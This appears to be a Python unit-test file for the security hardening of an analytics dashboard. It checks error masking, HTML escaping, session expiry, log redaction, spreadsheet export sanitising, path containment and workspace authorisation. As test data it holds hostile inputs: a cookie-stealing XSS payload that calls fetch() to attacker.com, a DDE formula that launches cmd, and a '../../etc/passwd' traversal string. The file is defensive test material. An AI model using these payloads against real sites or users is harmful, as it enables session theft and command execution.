"""
AUREVIX — Application Security Hardening — Phase 7 Unit Tests
Production Web Security, Secure Error Handling, Browser Security, Privacy & Defense-in-Depth.
"""

import json
import time
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

from dashboard.analytics.error_handler import (
    safe_error_message,
    log_internal_error,
    handle_application_error,
    get_correlation_id
)
from dashboard.analytics.security_utils import (
    escape_html_text,
    sanitize_upload_filename,
    is_safe_path,
    sanitize_for_spreadsheet_export
)
from dashboard.analytics.auth_manager import AuthManager, UserStore
from dashboard.analytics.workspace_manager import WorkspaceManager
from dashboard.analytics.persistent_storage import PersistentStorageManager
from dashboard.analytics.security_monitor import SecurityMonitor
from src.config.security_settings import validate_production_security, SECURITY_SETTINGS

ROOT = Path(__file__).resolve().parent.parent.parent


# ==============================================================================
# 1. ERROR HANDLING & EXCEPTION MASKING TESTS
# ==============================================================================

def test_user_error_does_not_expose_stack_trace():
    """Verify user-facing error messages omit stack traces and line numbers."""
    try:
        raise RuntimeError("Internal crash in C:\\aurevix\\engine.py at line 42: DB failure")
    except Exception as exc:
        msg = safe_error_message(exc, "dataset_analysis")
        assert "traceback" not in msg.lower()
        assert "line 42" not in msg
        assert "engine.py" not in msg


def test_error_does_not_expose_filesystem_path():
    """Verify internal Windows and Linux paths are stripped from safe messages."""
    exc = FileNotFoundError("Cannot open D:\\Projects\\aurevix\\data\\secrets\\master.key")
    msg = safe_error_message(exc, "file_load")
    assert "D:\\Projects" not in msg
    assert "master.key" not in msg


def test_error_does_not_expose_database_credentials():
    """Verify database URLs with passwords are not leaked in user errors."""
    exc = ConnectionError("Failed to connect to postgresql://admin:secret123@10.0.0.1:5432/aurevix_dw")
    msg = safe_error_message(exc, "db_connect")
    assert "secret123" not in msg
    assert "10.0.0.1" not in msg


def test_error_generates_correlation_id():
    """Verify handle_application_error produces a traceable correlation ID."""
    exc = ValueError("Invalid matrix shape")
    display_msg = handle_application_error(exc, "dimension_check", user_id="u_test", show_ui=False)
    assert "Reference ID:" in display_msg
    corr_id = get_correlation_id()
    assert isinstance(corr_id, str)
    assert len(corr_id) >= 8


# ==============================================================================
# 2. BROWSER SECURITY & XSS DEFENSE TESTS
# ==============================================================================

def test_html_script_payload_is_escaped():
    """Verify executable <script> tags are neutralized via HTML entity encoding."""
    xss_payload = "<script>alert('XSS-ATTACK')</script>"
    escaped = escape_html_text(xss_payload)
    assert "<script>" not in escaped
    assert "&lt;script&gt;" in escaped
    assert "&lt;/script&gt;" in escaped


def test_html_event_handler_payload_is_escaped():
    """Verify HTML image and SVG event-handler injection attempts are escaped."""
    img_payload = '<img src="x" onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">'
    escaped = escape_html_text(img_payload)
    assert "<img" not in escaped
    assert "&lt;img" in escaped


def test_legitimate_business_text_preserved():
    """Verify business names containing ampersands or math symbols remain readable."""
    biz_text = "Johnson & Johnson Financial Analytics (Q3 + Q4 > Target)"
    escaped = escape_html_text(biz_text)
    assert "Johnson &amp; Johnson" in escaped
    assert "Target" in escaped


# ==============================================================================
# 3. SESSION & TOKEN SECURITY TESTS
# ==============================================================================

def test_session_id_not_exposed():
    """Verify raw session identifiers are not displayed in error logs or string representations."""
    import streamlit as st
    AuthManager.initialize_session()
    raw_user = {"id": "u_safe", "email": "safe@aurevix.com", "role": "USER"}
    sess_id = AuthManager.login(raw_user)
    assert isinstance(sess_id, str)
    # Session state must never store passwords or hashes
    auth_state = st.session_state["auth"]
    assert "password" not in auth_state
    assert "password_hash" not in auth_state


def test_logout_invalidates_session():
    """Verify logging out invalidates session state and clears active credentials."""
    import streamlit as st
    AuthManager.initialize_session()
    raw_user = {"id": "u_logout", "email": "logout@aurevix.com", "role": "USER"}
    AuthManager.login(raw_user)
    assert AuthManager.is_authenticated() is True

    AuthManager.logout()
    assert AuthManager.is_authenticated() is False
    assert st.session_state["auth"]["user_id"] is None


def test_expired_session_cannot_access_resource():
    """Verify expired session cannot authenticate or access protected resources."""
    import streamlit as st
    AuthManager.initialize_session()
    raw_user = {"id": "u_exp", "email": "exp@aurevix.com", "role": "USER"}
    AuthManager.login(raw_user)

    # Force expiration timestamp into the past
    st.session_state["auth"]["expires_at"] = time.time() - 100
    assert AuthManager.is_authenticated() is False


# ==============================================================================
# 4. PRODUCTION SAFEGUARDS & CREDENTIAL CHECKS
# ==============================================================================

def test_debug_mode_disabled_in_production():
    """Verify production safeguards reject default database credentials."""
    with pytest.raises(ValueError) as excinfo:
        validate_production_security(
            env_name="production",
            pg_password="aurevix_secure_password_change_me",
            secret_key="my_super_secret_production_key_32chars"
        )
    assert "Insecure or default database password" in str(excinfo.value)


def test_default_credentials_rejected():
    """Verify production safeguards reject placeholder SECRET_KEY."""
    with pytest.raises(ValueError) as excinfo:
        validate_production_security(
            env_name="production",
            pg_password="ValidCustomProductionPassword#999!",
            secret_key="your_secret_key_here"
        )
    assert "Production SECRET_KEY" in str(excinfo.value)


def test_production_security_validation_masks_secrets():
    """Verify validation error messages do not disclose secret values."""
    with pytest.raises(ValueError) as excinfo:
        validate_production_security(
            env_name="production",
            pg_password="aurevix_secure_password_change_me",
            secret_key="short"
        )
    err_str = str(excinfo.value)
    assert "aurevix_secure_password_change_me" not in err_str


# ==============================================================================
# 5. API & HEALTH DIAGNOSTIC TESTS
# ==============================================================================

def test_health_endpoint_contains_no_secrets():
    """Verify platform health probe output contains no passwords or keys."""
    from src.common.health import PlatformHealthChecker
    checker = PlatformHealthChecker()
    liveness = checker.check_liveness()
    content = json.dumps(liveness)
    assert "password" not in content.lower()
    assert "secret" not in content.lower()
    assert "api_key" not in content.lower()


def test_unauthenticated_protected_operation_rejected():
    """Verify unauthenticated user cannot access admin or owner resources."""
    with patch("dashboard.analytics.auth_manager.AuthManager.is_authenticated", return_value=False):
        assert AuthManager.is_authenticated() is False


# ==============================================================================
# 6. PRIVACY & EXPORT SAFETY TESTS
# ==============================================================================

def test_logs_do_not_contain_password(tmp_path):
    """Verify error handler sanitizes passwords before logging."""
    from src.common.logger import sanitize_log_text
    raw_text = "Login failed for user test@aurevix.com with password=SecretPassword123"
    sanitized = sanitize_log_text(raw_text)
    assert "SecretPassword123" not in sanitized


def test_logs_do_not_contain_api_key():
    """Verify error handler sanitizes API keys before logging."""
    from src.common.logger import sanitize_log_text
    raw_text = "AI provider error with key AIzaSyA1234567890abcdef"
    sanitized = sanitize_log_text(raw_text)
    assert "AIzaSyA1234567890abcdef" not in sanitized


def test_exports_do_not_contain_secrets():
    """Verify exported spreadsheet DataFrames neutralize formula injection triggers."""
    import pandas as pd
    dirty_df = pd.DataFrame({"Customer": ["Acme Corp", "=cmd|' /C calc'!A0", "@SUM(1+1)"]})
    clean_df = sanitize_for_spreadsheet_export(dirty_df)
    assert clean_df["Customer"].iloc[1].startswith("'=")
    assert clean_df["Customer"].iloc[2].startswith("'@")


# ==============================================================================
# 7. TEMPORARY FILE & STORAGE SAFETY TESTS
# ==============================================================================

def test_temp_file_path_is_contained():
    """Verify paths constructed in data workspace are contained in approved root."""
    target = ROOT / "data/user_workspaces/my_ws.json"
    assert is_safe_path(target, ROOT) is True


def test_user_filename_cannot_escape_temp_directory():
    """Verify directory traversal tokens are stripped from filenames."""
    nasty_filename = "../../etc/passwd"
    clean_name = sanitize_upload_filename(nasty_filename)
    assert "../" not in clean_name
    assert ".." not in clean_name
    assert "passwd" in clean_name


# ==============================================================================
# 8. AUTHORIZATION DEFENSE-IN-DEPTH TESTS
# ==============================================================================

def test_user_cannot_access_other_user_resource(tmp_path):
    """Verify user cannot load another user's workspace."""
    with patch("dashboard.analytics.auth_manager.AuthManager.get_current_user_id", return_value="alice"), \
         patch("dashboard.analytics.auth_manager.AuthManager.has_role", return_value=False):
        # Create bob's workspace
        bob_ws = {"name": "Bob's Work", "owner_user_id": "bob"}
        WorkspaceManager.STORAGE_PATH.mkdir(parents=True, exist_ok=True)
        ws_path = WorkspaceManager.STORAGE_PATH / "bob_ws.json"
        ws_path.write_text(json.dumps(bob_ws), encoding="utf-8")

        res = WorkspaceManager.load_workspace("bob_ws")
        assert res is None


def test_user_cannot_delete_other_user_resource():
    """Verify user cannot delete another user's workspace."""
    with patch("dashboard.analytics.auth_manager.AuthManager.get_current_user_id", return_value="alice"), \
         patch("dashboard.analytics.auth_manager.AuthManager.has_role", return_value=False):
        bob_ws = {"name": "Bob's Work", "owner_user_id": "bob"}
        WorkspaceManager.STORAGE_PATH.mkdir(parents=True, exist_ok=True)
        ws_path = WorkspaceManager.STORAGE_PATH / "bob_ws.json"
        ws_path.write_text(json.dumps(bob_ws), encoding="utf-8")

        del_res = WorkspaceManager.delete_workspace("bob_ws")
        assert del_res is False


def test_admin_only_security_center():
    """Verify normal user cannot access admin role."""
    with patch("dashboard.analytics.auth_manager.AuthManager.has_role", return_value=False):
        assert AuthManager.has_role("ADMIN") is False


# ==============================================================================
# 9. RATE LIMITING RESILIENCE & MEMORY CLEANUP
# ==============================================================================

def test_rate_limit_memory_cleanup():
    """Verify cleanup_expired_entries removes old tracker keys."""
    SecurityMonitor.reset_state()
    # Add dummy record with old timestamp
    SecurityMonitor._action_timestamps["login:old_ip"] = [time.time() - 4000]
    pruned = SecurityMonitor.cleanup_expired_entries(max_age_seconds=3600)
    assert pruned >= 1
    assert "login:old_ip" not in SecurityMonitor._action_timestamps


def test_rate_limit_does_not_crash_application():
    """Verify rate limiter functions smoothly without exceptions under rapid queries."""
    for i in range(15):
        allowed, msg = SecurityMonitor.check_rate_limit("search", "user_stress", max_requests=10, window_seconds=60)
        assert isinstance(allowed, bool)
